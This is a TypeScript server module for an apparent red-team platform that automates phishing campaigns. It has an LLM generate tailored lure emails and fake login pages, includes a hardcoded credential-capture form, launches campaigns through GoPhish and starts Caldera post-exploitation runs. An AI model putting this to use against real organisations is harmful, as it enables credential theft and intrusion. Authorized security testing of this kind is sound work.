/**
 * Phishing Campaign Management Sub-Router
 *
 * Handles the full campaign lifecycle: intel feed → materialize → draft CRUD →
 * deploy to GoPhish → launch → sync stats → trigger Caldera post-exploitation.
 * Extracted from phishing-ops.ts for maintainability.
 */

import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { protectedProcedure, router } from "../../_core/trpc";
import { getDb } from "../../db";
import {
  phishingDrafts, InsertPhishingDraft,
  domainIntelScans,
  engagementPipelines,
} from "../../../drizzle/schema";
import { eq, desc, and, sql, inArray } from "drizzle-orm";
import { fetchGophish, requireDb } from "./shared";

export const campaignMgmtRouter = router({
  getIntelFeed: protectedProcedure
    .input(z.object({
      limit: z.number().min(1).max(100).default(50),
      statusFilter: z.enum(["all", "unmaterialized", "materialized"]).default("all"),
    }).optional())
    .query(async ({ input }) => {
      const db = await requireDb();
      const opts = input || { limit: 50, statusFilter: "all" };

      const scans = await db.select({
        id: domainIntelScans.id,
        domain: domainIntelScans.primaryDomain,
        status: domainIntelScans.status,
        clientType: domainIntelScans.clientType,
        sector: domainIntelScans.sector,
        campaignRecommendations: domainIntelScans.campaignRecommendations,
        pipelineOutput: domainIntelScans.pipelineOutput,
        createdAt: domainIntelScans.createdAt,
      })
        .from(domainIntelScans)
        .where(eq(domainIntelScans.status, "scan_complete"))
        .orderBy(desc(domainIntelScans.createdAt))
        .limit(opts.limit);

      const existingDrafts = await db.select({
        scanId: phishingDrafts.scanId,
        campaignRecommendationIndex: phishingDrafts.campaignRecommendationIndex,
        status: phishingDrafts.status,
        id: phishingDrafts.id,
      }).from(phishingDrafts);

      const draftMap = new Map<string, { id: number; status: string }>();
      for (const d of existingDrafts) {
        if (d.scanId != null && d.campaignRecommendationIndex != null) {
          draftMap.set(`${d.scanId}-${d.campaignRecommendationIndex}`, { id: d.id, status: d.status });
        }
      }

      const feed: Array<{
        scanId: number;
        domain: string;
        sector: string | null;
        clientType: string | null;
        scanDate: Date;
        recommendationIndex: number;
        recommendation: any;
        threatActorMatches: any;
        materialized: boolean;
        draftId: number | null;
        draftStatus: string | null;
      }> = [];

      for (const scan of scans) {
        const recs = (scan.campaignRecommendations as any[]) || [];
        const pipelineOut = scan.pipelineOutput as any;
        const actorMatches = pipelineOut?.threatActorMatches;
        for (let i = 0; i < recs.length; i++) {
          const key = `${scan.id}-${i}`;
          const draft = draftMap.get(key);
          const materialized = !!draft;

          if (opts.statusFilter === "unmaterialized" && materialized) continue;
          if (opts.statusFilter === "materialized" && !materialized) continue;

          feed.push({
            scanId: scan.id,
            domain: scan.domain as string,
            sector: scan.sector as string | null,
            clientType: scan.clientType as string | null,
            scanDate: scan.createdAt,
            recommendationIndex: i,
            recommendation: recs[i],
            threatActorMatches: actorMatches,
            materialized,
            draftId: draft?.id ?? null,
            draftStatus: draft?.status ?? null,
          });
        }
      }

      const priorityOrder: Record<string, number> = { critical: 0, high: 1, medium: 2, low: 3 };
      feed.sort((a, b) => {
        const pa = priorityOrder[a.recommendation?.priority] ?? 3;
        const pb = priorityOrder[b.recommendation?.priority] ?? 3;
        return pa - pb;
      });

      return { feed, totalScans: scans.length, totalRecommendations: feed.length };
    }),

  materialize: protectedProcedure
    .input(z.object({
      scanId: z.number(),
      recommendationIndex: z.number(),
      campaignName: z.string().optional(),
      targetEmails: z.array(z.object({
        email: z.string(),
        firstName: z.string().optional(),
        lastName: z.string().optional(),
        position: z.string().optional(),
      })).optional(),
    }))
    .mutation(async ({ input, ctx }) => {
      const db = await requireDb();

      const existing = await db.select().from(phishingDrafts)
        .where(and(
          eq(phishingDrafts.scanId, input.scanId),
          sql`${phishingDrafts.campaignRecommendationIndex} = ${input.recommendationIndex}`
        ));
      if (existing.length > 0) {
        throw new TRPCError({ code: "CONFLICT", message: "This recommendation has already been materialized", cause: { draftId: existing[0].id } });
      }

      const [scan] = await db.select().from(domainIntelScans)
        .where(eq(domainIntelScans.id, input.scanId));
      if (!scan) throw new TRPCError({ code: "NOT_FOUND", message: "Scan not found" });

      const recs = (scan.campaignRecommendations as any[]) || [];
      const rec = recs[input.recommendationIndex];
      if (!rec) throw new TRPCError({ code: "NOT_FOUND", message: "Campaign recommendation not found at index" });

      const pipelineOut = scan.pipelineOutput as any;
      const actorMatches = pipelineOut?.threatActorMatches;
      const topActor = actorMatches?.topMatches?.[0];

      const { invokeLLM } = await import("../../_core/llm");

      const materializePrompt = `You are a red team phishing campaign designer for AceofCloud (Ace C3 platform).
Given the following domain intelligence and campaign recommendation, generate a complete phishing campaign package.

TARGET DOMAIN: ${scan.primaryDomain}
SECTOR: ${scan.sector || "unknown"}
CLIENT TYPE: ${scan.clientType || "enterprise"}
CAMPAIGN NAME: ${input.campaignName || rec.name}
CAMPAIGN TYPE: ${rec.type}
PRIORITY: ${rec.priority}
DESCRIPTION: ${rec.description}
TARGET ASSETS: ${JSON.stringify(rec.targetAssets || [])}
ATTACK CHAIN: ${JSON.stringify(rec.attackChain || [])}
MITRE TACTICS: ${JSON.stringify(rec.mitreTactics || [])}
MATCHED THREAT ACTOR: ${topActor ? `${topActor.actorName} (confidence: ${topActor.confidence}%)` : "None"}
GOPHISH TEMPLATE SUGGESTIONS: ${JSON.stringify(rec.gophishTemplates || [])}

Generate a JSON object with these fields:
{
  "templateSubject": "Realistic email subject line",
  "templateHtml": "Full HTML email body with GoPhish variables: {{.FirstName}}, {{.LastName}}, {{.Email}}, {{.TrackingURL}}, {{.URL}}, {{.From}}. Must look like a legitimate business email. Include proper HTML structure with inline CSS.",
  "templateText": "Plain text version of the email",
  "landingPageHtml": "HTML for a credential capture landing page that mimics the target domain's login page. Include form fields for email and password. Use GoPhish action URL.",
  "landingPageRedirectUrl": "https://${scan.primaryDomain}",
  "smtpProfileName": "Ace C3 - ${scan.primaryDomain} Profile"
}

Make the phishing content highly realistic and tailored to the target domain and sector.`;

      let generatedContent: any = {};
      try {
        const llmResponse = await invokeLLM({
          messages: [
            { role: "system", content: "You are a red team phishing content generator. Output only valid JSON." },
            { role: "user", content: materializePrompt },
          ],
          response_format: {
            type: "json_schema",
            json_schema: {
              name: "phishing_draft",
              strict: true,
              schema: {
                type: "object",
                properties: {
                  templateSubject: { type: "string", description: "Email subject line" },
                  templateHtml: { type: "string", description: "Full HTML email body" },
                  templateText: { type: "string", description: "Plain text email" },
                  landingPageHtml: { type: "string", description: "Landing page HTML" },
                  landingPageRedirectUrl: { type: "string", description: "Redirect URL after capture" },
                  smtpProfileName: { type: "string", description: "SMTP profile name" },
                },
                required: ["templateSubject", "templateHtml", "templateText", "landingPageHtml", "landingPageRedirectUrl", "smtpProfileName"],
                additionalProperties: false,
              },
            },
          },
        });
        const rawContent = llmResponse?.choices?.[0]?.message?.content;
        if (rawContent && typeof rawContent === "string") {
          generatedContent = JSON.parse(rawContent);
        }
      } catch (e: any) {
        console.error("[PhishingOps] LLM materialization error:", e.message);
        generatedContent = {
          templateSubject: rec.gophishTemplates?.[0]?.subject || `Important: Action Required - ${scan.primaryDomain}`,
          templateHtml: `<html><body><p>Dear {{.FirstName}},</p><p>Please review the attached document regarding your ${scan.primaryDomain} account.</p><p><a href="{{.URL}}">Click here to review</a></p><p>Best regards,<br>IT Security Team</p></body></html>`,
          templateText: `Dear {{.FirstName}},\n\nPlease review the attached document regarding your ${scan.primaryDomain} account.\n\nClick here to review: {{.URL}}\n\nBest regards,\nIT Security Team`,
          landingPageHtml: `<html><body><h2>${scan.primaryDomain} - Login</h2><form method="POST"><input name="email" placeholder="Email" /><input name="password" type="password" placeholder="Password" /><button type="submit">Sign In</button></form></body></html>`,
          landingPageRedirectUrl: `https://${scan.primaryDomain}`,
          smtpProfileName: `Ace C3 - ${scan.primaryDomain} Profile`,
        };
      }

      const campaignName = input.campaignName || rec.name || `${scan.primaryDomain} - ${rec.type} Campaign`;
      const templateName = `[Ace C3] ${campaignName} - Template`;
      const landingPageName = `[Ace C3] ${campaignName} - Landing Page`;
      const targetGroupName = `[Ace C3] ${campaignName} - Targets`;

      // Dedup guard: check if a draft already exists for this scan + recommendation index
      const [existingDraft] = await db.select({ id: phishingDrafts.id })
        .from(phishingDrafts)
        .where(and(
          eq(phishingDrafts.scanId, input.scanId),
          eq(phishingDrafts.campaignRecommendationIndex, input.recommendationIndex)
        ))
        .limit(1);
      if (existingDraft) {
        return {
          draftId: existingDraft.id,
          campaignName,
          status: "draft",
          message: "Draft already exists for this recommendation. Returning existing draft.",
          deduplicated: true,
        };
      }

      const draftData: InsertPhishingDraft = {
        scanId: input.scanId,
        campaignRecommendationIndex: input.recommendationIndex,
        status: "draft",
        campaignName,
        campaignType: rec.type || "phishing",
        priority: rec.priority || "medium",
        targetDomain: scan.primaryDomain,
        targetSector: (scan.sector as string) || null,
        templateName,
        templateSubject: generatedContent.templateSubject,
        templateHtml: generatedContent.templateHtml,
        templateText: generatedContent.templateText,
        landingPageName,
        landingPageHtml: generatedContent.landingPageHtml,
        landingPageRedirectUrl: generatedContent.landingPageRedirectUrl,
        captureCredentials: true,
        capturePasswords: false,
        targetGroupName,
        targetEmails: input.targetEmails || null,
        smtpProfileName: generatedContent.smtpProfileName,
        attackChain: rec.attackChain || null,
        calderaAbilities: rec.calderaAbilities || null,
        threatActorId: topActor?.actorId || null,
        threatActorName: topActor?.actorName || null,
        matchRationale: topActor ? `Matched with ${topActor.confidence}% confidence based on domain intel scan` : null,
        createdBy: ctx.user?.id || null,
      };

      const [result] = await db.insert(phishingDrafts).values(draftData).$returningId();

      return {
        draftId: result.id,
        campaignName,
        status: "draft",
        message: "Campaign recommendation materialized into draft. Review and edit before deploying to GoPhish.",
      };
    }),

  listDrafts: protectedProcedure
    .input(z.object({
      status: z.enum(["draft", "approved", "deployed", "launched", "completed", "archived", "all"]).default("all"),
      scanId: z.number().optional(),
      limit: z.number().min(1).max(100).default(50),
    }).optional())
    .query(async ({ input }) => {
      const db = await requireDb();
      const opts = input || { status: "all", limit: 50 };

      const conditions = [];
      if (opts.status !== "all") {
        conditions.push(eq(phishingDrafts.status, opts.status as any));
      }
      if (opts.scanId) {
        conditions.push(eq(phishingDrafts.scanId, opts.scanId));
      }

      const where = conditions.length > 0 ? and(...conditions) : undefined;

      const drafts = await db.select().from(phishingDrafts)
        .where(where)
        .orderBy(desc(phishingDrafts.createdAt))
        .limit(opts.limit);

      return { drafts, total: drafts.length };
    }),

  getDraft: protectedProcedure
    .input(z.object({ id: z.number() }))
    .query(async ({ input }) => {
      const db = await requireDb();
      const [draft] = await db.select().from(phishingDrafts)
        .where(eq(phishingDrafts.id, input.id));
      if (!draft) throw new TRPCError({ code: "NOT_FOUND", message: "Draft not found" });
      return draft;
    }),

  updateDraft: protectedProcedure
    .input(z.object({
      id: z.number(),
      campaignName: z.string().optional(),
      templateSubject: z.string().optional(),
      templateHtml: z.string().optional(),
      templateText: z.string().optional(),
      landingPageHtml: z.string().optional(),
      landingPageRedirectUrl: z.string().optional(),
      captureCredentials: z.boolean().optional(),
      capturePasswords: z.boolean().optional(),
      targetEmails: z.array(z.object({
        email: z.string(),
        firstName: z.string().optional(),
        lastName: z.string().optional(),
        position: z.string().optional(),
      })).optional(),
      phishingUrl: z.string().optional(),
      autoTriggerCaldera: z.boolean().optional(),
      triggerCondition: z.any().optional(),
      launchDate: z.string().optional(),
      sendByDate: z.string().optional(),
      status: z.enum(["draft", "approved", "archived"]).optional(),
    }))
    .mutation(async ({ input }) => {
      const db = await requireDb();
      const { id, launchDate, sendByDate, ...updates } = input;

      const [existing] = await db.select().from(phishingDrafts)
        .where(eq(phishingDrafts.id, id));
      if (!existing) throw new TRPCError({ code: "NOT_FOUND", message: "Draft not found" });
      if (existing.status === "launched" || existing.status === "completed") {
        throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Cannot edit a launched or completed campaign" });
      }

      const updateData: any = { ...updates };
      if (launchDate) updateData.launchDate = new Date(launchDate);
      if (sendByDate) updateData.sendByDate = new Date(sendByDate);

      await db.update(phishingDrafts).set(updateData).where(eq(phishingDrafts.id, id));
      return { success: true, message: "Draft updated" };
    }),

  deployToGophish: protectedProcedure
    .input(z.object({ draftId: z.number() }))
    .mutation(async ({ input }) => {
      const db = await requireDb();

      const [draft] = await db.select().from(phishingDrafts)
        .where(eq(phishingDrafts.id, input.draftId));
      if (!draft) throw new TRPCError({ code: "NOT_FOUND", message: "Draft not found" });
      if (draft.status !== "draft" && draft.status !== "approved") {
        throw new TRPCError({ code: "PRECONDITION_FAILED", message: `Cannot deploy a draft with status: ${draft.status}` });
      }

      const results: { templateId?: number; pageId?: number; groupId?: number; errors: string[] } = { errors: [] };

      if (draft.templateHtml) {
        try {
          const template = await fetchGophish("/api/templates/", "POST", {
            name: draft.templateName || `${draft.campaignName} - Template`,
            subject: draft.templateSubject || "Important Notification",
            html: draft.templateHtml,
            text: draft.templateText || "",
          });
          results.templateId = template?.id;
        } catch (e: any) { results.errors.push(`Template: ${e.message}`); }
      }

      if (draft.landingPageHtml) {
        try {
          const page = await fetchGophish("/api/pages/", "POST", {
            name: draft.landingPageName || `${draft.campaignName} - Landing Page`,
            html: draft.landingPageHtml,
            capture_credentials: draft.captureCredentials ?? true,
            capture_passwords: draft.capturePasswords ?? false,
            redirect_url: draft.landingPageRedirectUrl || "",
          });
          results.pageId = page?.id;
        } catch (e: any) { results.errors.push(`Landing Page: ${e.message}`); }
      }

      const emails = (draft.targetEmails as any[]) || [];
      if (emails.length > 0) {
        try {
          const group = await fetchGophish("/api/groups/", "POST", {
            name: draft.targetGroupName || `${draft.campaignName} - Targets`,
            targets: emails.map((e: any) => ({
              first_name: e.firstName || "",
              last_name: e.lastName || "",
              email: e.email,
              position: e.position || "",
            })),
          });
          results.groupId = group?.id;
        } catch (e: any) { results.errors.push(`Target Group: ${e.message}`); }
      }

      const updateData: any = { status: "deployed" };
      if (results.templateId) updateData.gophishTemplateId = results.templateId;
      if (results.pageId) updateData.gophishPageId = results.pageId;
      if (results.groupId) updateData.gophishGroupId = results.groupId;

      await db.update(phishingDrafts).set(updateData).where(eq(phishingDrafts.id, input.draftId));

      return {
        success: results.errors.length === 0,
        draftId: input.draftId,
        gophishTemplateId: results.templateId,
        gophishPageId: results.pageId,
        gophishGroupId: results.groupId,
        errors: results.errors,
        message: results.errors.length === 0
          ? "All resources deployed to GoPhish. Ready to launch campaign."
          : `Deployed with ${results.errors.length} error(s): ${results.errors.join("; ")}`,
      };
    }),

  launchCampaign: protectedProcedure
    .input(z.object({
      draftId: z.number(),
      smtpProfileName: z.string(),
      phishingUrl: z.string(),
      launchDate: z.string().optional(),
      sendByDate: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      const db = await requireDb();

      const [draft] = await db.select().from(phishingDrafts)
        .where(eq(phishingDrafts.id, input.draftId));
      if (!draft) throw new TRPCError({ code: "NOT_FOUND", message: "Draft not found" });
      if (draft.status !== "deployed") {
        throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Draft must be deployed to GoPhish before launching" });
      }
      if (!draft.gophishTemplateId || !draft.gophishGroupId) {
        throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Missing GoPhish template or target group" });
      }

      const campaignPayload: any = {
        name: draft.campaignName,
        template: { name: draft.templateName },
        page: { name: draft.landingPageName || "" },
        smtp: { name: input.smtpProfileName },
        url: input.phishingUrl,
        groups: [{ name: draft.targetGroupName }],
      };
      if (input.launchDate) campaignPayload.launch_date = input.launchDate;
      if (input.sendByDate) campaignPayload.send_by_date = input.sendByDate;

      const campaign = await fetchGophish("/api/campaigns/", "POST", campaignPayload);

      await db.update(phishingDrafts).set({
        status: "launched",
        gophishCampaignId: campaign?.id,
        phishingUrl: input.phishingUrl,
        smtpProfileName: input.smtpProfileName,
        launchDate: input.launchDate ? new Date(input.launchDate) : new Date(),
        sendByDate: input.sendByDate ? new Date(input.sendByDate) : null,
      }).where(eq(phishingDrafts.id, input.draftId));

      return {
        success: true,
        gophishCampaignId: campaign?.id,
        message: `Campaign "${draft.campaignName}" launched in GoPhish`,
      };
    }),

  syncCampaignStats: protectedProcedure
    .input(z.object({ draftId: z.number() }).optional())
    .mutation(async ({ input }) => {
      const db = await requireDb();

      const conditions = [
        sql`${phishingDrafts.gophishCampaignId} IS NOT NULL`,
      ];
      if (input?.draftId) {
        conditions.push(eq(phishingDrafts.id, input.draftId));
      } else {
        conditions.push(inArray(phishingDrafts.status, ["launched"] as any));
      }

      const launchedDrafts = await db.select({
        id: phishingDrafts.id,
        gophishCampaignId: phishingDrafts.gophishCampaignId,
      }).from(phishingDrafts).where(and(...conditions));

      let synced = 0;
      for (const draft of launchedDrafts) {
        if (!draft.gophishCampaignId) continue;
        try {
          const campaign = await fetchGophish(`/api/campaigns/${draft.gophishCampaignId}`);
          if (campaign) {
            const stats = {
              sent: campaign.stats?.sent || 0,
              opened: campaign.stats?.opened || 0,
              clicked: campaign.stats?.clicked || 0,
              submitted: campaign.stats?.submitted_data || 0,
              reported: campaign.stats?.email_reported || 0,
              total: campaign.stats?.total || 0,
              status: campaign.status,
            };
            const updateData: any = { campaignStats: stats };
            if (campaign.status === "Completed") {
              updateData.status = "completed";
            }
            await db.update(phishingDrafts).set(updateData).where(eq(phishingDrafts.id, draft.id));
            synced++;
          }
        } catch (e: any) {
          console.error(`[PhishingOps] Failed to sync campaign ${draft.gophishCampaignId}:`, e.message);
        }
      }

      return { synced, total: launchedDrafts.length };
    }),

  triggerCaldera: protectedProcedure
    .input(z.object({
      draftId: z.number(),
      operationName: z.string().optional(),
      adversaryId: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      const db = await requireDb();
      const { ENV } = await import("../../_core/env");
      const calderaUrl = ENV.calderaBaseUrl;
      const calderaApiKey = ENV.calderaApiKey;

      if (!calderaUrl || !calderaApiKey) {
        throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Caldera not configured" });
      }

      const [draft] = await db.select().from(phishingDrafts)
        .where(eq(phishingDrafts.id, input.draftId));
      if (!draft) throw new TRPCError({ code: "NOT_FOUND", message: "Draft not found" });

      const opName = input.operationName || `[Ace C3] ${draft.campaignName} - Post-Exploitation`;
      const adversary = input.adversaryId || draft.threatActorId || undefined;

      const opPayload: any = {
        name: opName,
        source: { id: "ed32b9c3-9593-4c33-b0db-e2007315096b" },
        planner: { id: "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a" },
        auto_close: false,
      };
      if (adversary) opPayload.adversary = { adversary_id: adversary };

      const opRes = await fetch(`${calderaUrl}/api/v2/operations`, {
        method: "POST",
        headers: { "KEY": calderaApiKey, "Content-Type": "application/json" },
        body: JSON.stringify(opPayload),
      });

      if (!opRes.ok) {
        const errText = await opRes.text();
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: `Caldera operation creation failed: ${errText}` });
      }

      const operation = await opRes.json();

      await db.update(phishingDrafts).set({
        calderaOperationId: operation.id,
        autoTriggerCaldera: true,
      }).where(eq(phishingDrafts.id, input.draftId));

      return {
        success: true,
        calderaOperationId: operation.id,
        operationName: opName,
        message: `Caldera operation "${opName}" created and linked to campaign`,
      };
    }),
});
